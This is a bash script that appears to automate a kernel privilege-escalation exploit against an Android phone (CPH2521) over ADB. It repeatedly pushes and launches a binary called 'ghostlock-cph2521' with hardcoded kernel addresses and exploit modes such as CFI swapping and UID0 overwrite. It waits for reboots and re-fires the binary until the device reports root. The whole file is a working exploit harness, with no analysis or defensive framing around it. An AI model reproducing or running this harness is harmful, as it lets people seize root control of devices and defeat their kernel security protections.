#!/bin/bash
# autofocus.sh — self-contained punch lottery loop (focused +0x900 real_cred)
# Auto-fires, reads results, re-rolls. Stops on ROOTED_ID.txt.
ADB="./adb_local.exe"
WIFI=192.168.1.108:5555
cd "$(dirname "$0")"
MAX=${1:-10}

con() { MSYS_NO_PATHCONV=1 "$ADB" connect $WIFI >/dev/null 2>&1; MSYS_NO_PATHCONV=1 "$ADB" devices 2>/dev/null | grep -q "$WIFI.*device"; }

for n in $(seq 1 $MAX); do
  # settle / wait for device
  for w in $(seq 1 40); do
    con && break; sleep 20
  done
  con || { echo "roll$n: no device"; continue; }
  UP=$(MSYS_NO_PATHCONV=1 "$ADB" -s $WIFI shell "cut -d. -f1 /proc/uptime" 2>/dev/null | tr -d '\r')
  [ -n "$UP" ] && [ "$UP" -ge 140 ] 2>/dev/null || { echo "roll$n: uptime=$UP young, wait"; sleep 60; }

  # verify + push binary (rollback defense) + fire inline
  LMD5=$(md5sum ghostlock-cph2521 | awk '{print $1}')
  DMD5=$(MSYS_NO_PATHCONV=1 "$ADB" -s $WIFI shell "md5sum /data/local/tmp/gl_uid0 2>/dev/null" | tr -d '\r' | awk '{print $1}')
  [ "$DMD5" != "$LMD5" ] && MSYS_NO_PATHCONV=1 "$ADB" -s $WIFI push ghostlock-cph2521 /data/local/tmp/gl_uid0 >/dev/null 2>&1
  MSYS_NO_PATHCONV=1 "$ADB" -s $WIFI shell 'chmod 755 /data/local/tmp/gl_uid0 && cd /data/local/tmp && rm -f hkc.txt && nohup sh -c "MODE4_ONLY=1 MODE4_SLIDE_ZERO=1 MODE4_NULL_STORE=1 MODE4_SWAP_NOCFI=1 MODE4_UID0=1 SLIDE_P0_TARGET=0xffffff802a950700 DATAONLY_TARGET=0x2950700 KPHYS=0xa8000000 CORE_SEL=7 /data/local/tmp/gl_uid0 > /data/local/tmp/hkc.txt 2>&1" >/dev/null 2>&1 & echo FIRED' >/dev/null 2>&1
  echo "roll$n fired at uptime=$UP ($(date +%H:%M:%S))"

  # wait + read
  sleep 300
  con || { for w in $(seq 1 20); do sleep 25; con && break; done; }
  R=$(MSYS_NO_PATHCONV=1 "$ADB" -s $WIFI shell "cat /data/local/tmp/ROOTED_ID.txt /data/local/tmp/uid0_id.txt 2>/dev/null; grep -E 'LANDED|getuid_after|WIN' /data/local/tmp/hkc.txt 2>/dev/null | tail -4; getenforce" 2>/dev/null | tr -d '\r')
  echo "roll$n result:"; echo "$R"
  echo "$R" | grep -q "uid=0\|WIN\|ROOT\|uid=0" && { echo "*** ROOT ROLL $n ***"; exit 0; }
  sleep 90
done
echo "no root in $MAX rolls"
